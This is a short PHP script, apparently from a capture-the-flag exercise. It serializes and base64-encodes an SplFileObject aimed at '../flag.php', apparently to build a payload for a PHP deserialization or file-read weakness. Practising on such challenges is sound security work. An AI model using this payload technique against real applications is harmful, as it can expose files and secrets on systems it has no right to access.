<?php
$dir = "../flag.php";
$d = new SplFileObject($dir);
echo base64_encode(serialize($d));

